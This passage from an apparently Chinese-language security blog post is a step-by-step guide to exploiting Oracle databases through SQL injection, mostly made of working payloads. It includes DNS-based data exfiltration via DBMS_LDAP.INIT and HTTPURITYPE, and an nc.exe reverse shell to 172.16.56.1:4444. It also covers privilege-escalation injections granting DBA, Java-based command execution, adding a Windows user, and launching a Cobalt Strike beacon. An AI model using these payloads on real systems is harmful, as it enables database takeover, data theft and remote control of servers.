+<li><code>SYS.DBMS_LDAP.INIT</code>与 <code>utl_inaddr.get_host_address</code> 类似，很多时候数据服务器都是站库分离的，而且不一定能主动访问外网。但是有时候可能会允许 DNS 请求。并且这个函数在 10g/11g 中是 public 权限。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#39;.2eo2cw.dnslog.cn&#39;,80) from dual) is not null</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>HTTPURITYPE</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (SELECT HTTPURITYPE((select user from dual)||&#39;.j79nme.dnslog.cn&#39;).GETCLOB() FROM DUAL) is not null</span><br></pre></td></tr></table></figure>
+
+<p>Oracle HTTP代理实现跨库攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">union select cast(substr(httpuritype(‘http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqlinjection&#x2F;default3.asp’).getclob(),1,1000) as varchar(1000)) from dual--</span><br><span class="line"></span><br><span class="line">union select cast(substr(httpuritype(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection&#x2F;default3.asp?qid&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;all&#x2F;**&#x2F;select&#x2F;**&#x2F;1,@@version,user&#39;).getclob(),1,1000) as varchar(1000)) from dual--</span><br><span class="line"></span><br><span class="line">union select cast(substr(httpuritype(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection&#x2F;default3.asp?qid&#x3D;1;exec&#x2F;**&#x2F;master..xp_cmdshell&#x2F;**&#x2F;&quot;C:\nc.exe%20172.16.56.1%204444%20-e%20cmd.exe&quot; &#39;).  getclob(),1,3000) as varchar(3000)) from dual--</span><br></pre></td></tr></table></figure>
+
+<h2 id="Oracle11g-命令执行"><a href="#Oracle11g-命令执行" class="headerlink" title="Oracle11g 命令执行"></a>Oracle11g 命令执行</h2><ul>
+<li>直连数据库情况下</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Windows下 通过关键字host</span><br><span class="line">host whoami</span><br><span class="line"></span><br><span class="line"># Linux下 通过关键字符 !</span><br><span class="line">!whoami</span><br></pre></td></tr></table></figure>
+
+<p>11.2.0.1.0 命令执行步骤：</p>
+<ol>
+<li>创建JAVA Source</li>
+<li>赋予执行权限</li>
+<li>创建函数</li>
+<li>调用函数执行命令</li>
+</ol>
+<h3 id="dbms-xmlquery-newcontext"><a href="#dbms-xmlquery-newcontext" class="headerlink" title="dbms_xmlquery.newcontext"></a>dbms_xmlquery.newcontext</h3><ul>
+<li>创建JAVA Source</li>
+</ul>
+<p>这里创建表时只有<code>phone</code>字段允许为null,因此需要匹配该字段数据类型，创建JAVA Source。（<code>dbms_xmlquery.newcontext</code>创建JAVA Source时返回为null）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,null,null,dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;;commit;end;&#39;) from dual</span><br></pre></td></tr></table></figure>
+
+<p>在数据库直接执行时：</p>
+<p><img src="/posts/bb8356a5/010.png" alt="image-20200702093300028"></p>
+<p>联合查询时：</p>
+<p><img src="/posts/bb8356a5/011.png" alt="image-20200702093117462"></p>
+<p>查看<code>all_objects</code>内部的变化。</p>
+<p><img src="/posts/bb8356a5/012.png" alt="image-20200702093729519"></p>
+<ul>
+<li>赋予执行权限</li>
+</ul>
+<p>我这了测试了三个用户，都不需要执行权限。</p>
+<p>cc为system连接，root为root用户连接，test为test连接。</p>
+<p><img src="/posts/bb8356a5/013.png" alt="image-20200702142914225"></p>
+<p><img src="/posts/bb8356a5/014.png" alt="image-20200702143015246"></p>
+<p>提权语句,这里没有用到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;SYSTEM&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;EXECUTE&#39;&#39;&#39;&#39;);end;&#39;&#39;commit;end;&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 使用SYS.LT.CREATEWORKSPACE提权 9iR2, 10gR1, 10gR2 and 11gR1     #fixed 2009.7</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39;</span><br><span class="line">begin SYS.LT.CREATEWORKSPACE(&#39;&#39;&#39;&#39;A10&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; and TEST.pwn()&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;x&#39;&#39;&#39;&#39;);SYS.LT.REMOVEWORKSPA CE(&#39;&#39;&#39;&#39;A10&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; and TEST.pwn()&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;x&#39;&#39;&#39;&#39;);end;&#39;&#39;; commit; end;&#39;) from dual</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用sys.dbms_cdc_publish.create_change_set提权 10gR1, 10gR2, 11g R1 and 11gR2   #fixed 2010.10</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39; begin sys.dbms_cdc_publish.create_change_set(&#39;&#39;&#39;&#39; a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;||TEST.pwn()||&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;Y&#39;&#39;&#39;&#39;,s ysdate,sysdate);end;&#39;&#39;; commit; end;&#39;) from dual</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用GET_DOMAIN_INDEX_TABLES Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;foo&#39;,&#39;bar&#39;,&#39;DBMS_OUTPUT&quot;.PUT_LINE(:P1); EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant dba to TEST&#39;&#39;&#39;&#39;; END;&#39;&#39;; END;--&#39;, &#39;&#39;, 0, &#39;1&#39;, 0) from dual</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建函数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,null,null,dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;; &#39;&#39;;commit;end;&#39;) from dual</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/015.png" alt="image-20200701164925448"></p>
+<ul>
+<li>判断函数是否创建成功</li>
+</ul>
+<p>查看all_objects表中的是否已经存刚才创建的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,null,null,OBJECT_ID from all_objects where object_name &#x3D;&#39;LINXRUNCMD&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/016.png" alt="image-20200701165318737"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from all_objects where object_name like &#39;%LINX%&#39; or object_name like &#39;%Linx%&#39;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行命令</li>
+</ul>
+<p>注意⚠️：执行命令时候返回的结果是字符串，所以无法用phone字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,LinxRunCMD(&#39;whoami&#39;),null,null from dual</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/017.png" alt="image-20200701171038862"></p>
+<ul>
+<li>删除函数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function LinxRunCMD</span><br></pre></td></tr></table></figure>
+
+<p>以上测试是在system用户下进行，那么如果没有DBA权限呢？</p>
+<p><img src="/posts/bb8356a5/018.png" alt="image-20200702151015602"></p>
+<p>这里使用ROOT用户，根据上述过程，依旧可以。</p>
+<p><img src="/posts/bb8356a5/019.png" alt="image-20200702151119873"></p>
+<p><strong>以下函数均不能在11.2.0.1.0上正常执行命令。（这里是我自己的测试环境- -）</strong></p>
+<h3 id="DBMS-JAVA-TEST-FUNCALL"><a href="#DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="DBMS_JAVA_TEST.FUNCALL()"></a>DBMS_JAVA_TEST.FUNCALL()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select DBMS_JAVA_TEST.FUNCALL(&#39;oracle&#x2F;aurora&#x2F;util&#x2F;Wrapper&#39;,&#39;main&#39;,&#39;c:\\Windows\\System32\\cmd.exe&#39;,&#39;&#x2F;c&#39;,&#39;whoami&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/020.png" alt="image-20200702115920307"></p>
+<h3 id="DBMS-JAVA-RUNJAVA"><a href="#DBMS-JAVA-RUNJAVA" class="headerlink" title="DBMS_JAVA.RUNJAVA()"></a>DBMS_JAVA.RUNJAVA()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DBMS_JAVA.RUNJAVA(&#39;oracle&#x2F;aurora&#x2F;util&#x2F;Wrapper  c:\\Windows\\System32\\cmd.exe &#x2F;c whoami&#39;) FROM DUAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/021.png" alt="image-20200702141620519"> </p>
+<h3 id="DBMS-REPCAT-RPC-VALIDATE-REMOTE-RC"><a href="#DBMS-REPCAT-RPC-VALIDATE-REMOTE-RC" class="headerlink" title="DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC"></a>DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,&#39;VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new FileReader(filename)); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;CCCCC&#39;) from dual</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/022.png" alt="image-20200702143522190"></p>
+<h3 id="另外一种方式"><a href="#另外一种方式" class="headerlink" title="另外一种方式"></a>另外一种方式</h3><p>参考别人的，需要DBA权限，在本地测试不成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(&#39;DBMS_SCHEDULER.create_program(&#39;&#39;myprog10&#39;&#39;,&#39;&#39;EXECUTABLE&#39;&#39;,&#39;&#39;net user pwnedfromweb pwn3d!! &#x2F;add&#39;&#39;,0,TRUE);DBMS_SCHEDULER.create_job(job_name&#x3D;&gt;&#39;&#39;myjob10&#39;&#39;,program_name&#x3D;&gt;&#39;&#39;myprog10&#39;&#39;,start_date&#x3D;&gt;NULL,repeat_interval&#x3D;&gt;NULL,end_date&#x3D;&gt;NULL,enabled&#x3D;&gt;TRUE,auto_drop&#x3D;&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name&#x3D;&gt;&#39;&#39;myprog10&#39;&#39;);dbms_scheduler.purge_log;&#39;)from dual) is not null --</span><br></pre></td></tr></table></figure>
+
+<h2 id="Oracle-10g-命令执行"><a href="#Oracle-10g-命令执行" class="headerlink" title="Oracle 10g 命令执行"></a>Oracle 10g 命令执行</h2><p>Server 2003下<code>10.2.0.1.0</code>。</p>
+<h3 id="DBMS-EXPORT-EXTENSION"><a href="#DBMS-EXPORT-EXTENSION" class="headerlink" title="DBMS_EXPORT_EXTENSION"></a>DBMS_EXPORT_EXTENSION</h3><p>输出扩展功能包，其中存在三个危险函数，get_domian_index_metadata，get_v2_domain_index_tables，get_domain_index_tables。都是以sys权限定义，默认低权限用户可以调用。</p>
+<ul>
+<li>首先创建 JAVA Source</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Linux </span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new FileReader(filename)); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line"># 出现截断问题，导致dir,tasklist等命令无法执行，可以执行whoami,ipconfig等。。</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;Command&quot; as import java.io.*;public class Command&#123;public static String exec(String cmd) throws Exception&#123;String sb&#x3D;&quot;&quot;;BufferedInputStream in &#x3D; new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr &#x3D; inBr.readLine()) !&#x3D; null)sb+&#x3D;lineStr+&quot;\n&quot;;inBr.close();in.close();return sb;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>赋予执行权限</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission(&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;);end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; );end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建函数，返回值为null</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;Command.exec(java.lang.String) return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; &#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>赋予函数执行权限</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on LinxRunCMD to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on cmd to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行命令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ⚠️注意：该方法在Windows无法适用截断问题- - 只能执行连续字符命令，结果输出带有截断也无法，。。执行dir直接卡死了。。</span><br><span class="line">select sys.LinxRunCMD(&#39;&#x2F;bin&#x2F;bash -c &#x2F;usr&#x2F;bin&#x2F;whoami&#39;) from dual</span><br><span class="line"># ⚠️注意：结果中带有截断字符则报错。比如:net user，直接执行.exe没问题。这里为CS的🐎</span><br><span class="line">select sys.cmd(&#39;C:\Documents and Settings\Administrator\桌面\beacon.exe&#39;) from dual</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/023.png"></p>
+<h3 id="dbms-xmlquery-newcontext-1"><a href="#dbms-xmlquery-newcontext-1" class="headerlink" title="dbms_xmlquery.newcontext"></a>dbms_xmlquery.newcontext</h3><p>在本地Windows下10g没有成功，11g是可以的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 创建JAVA包</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;;commit;end;&#39;) from dual;</span><br><span class="line"></span><br><span class="line"># 赋予当前用户JAVA权限， 赋权失败会报错。</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission(&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;YY&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;);end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual;</span><br><span class="line"></span><br><span class="line"># 创建函数</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;; &#39;&#39;;commit;end;&#39;) from dual;</span><br><span class="line"></span><br><span class="line"># 删除创建的函数</span><br><span class="line">drop function LinxRunCMD</span><br><span class="line"># 执行命令</span><br><span class="line">select LinxRunCMD(&#39;whoami&#39;) from dual</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux反弹shell"><a href="#Linux反弹shell" class="headerlink" title="Linux反弹shell"></a>Linux反弹shell</h3><ul>
+<li>创建JAVA Source</li>
+</ul>
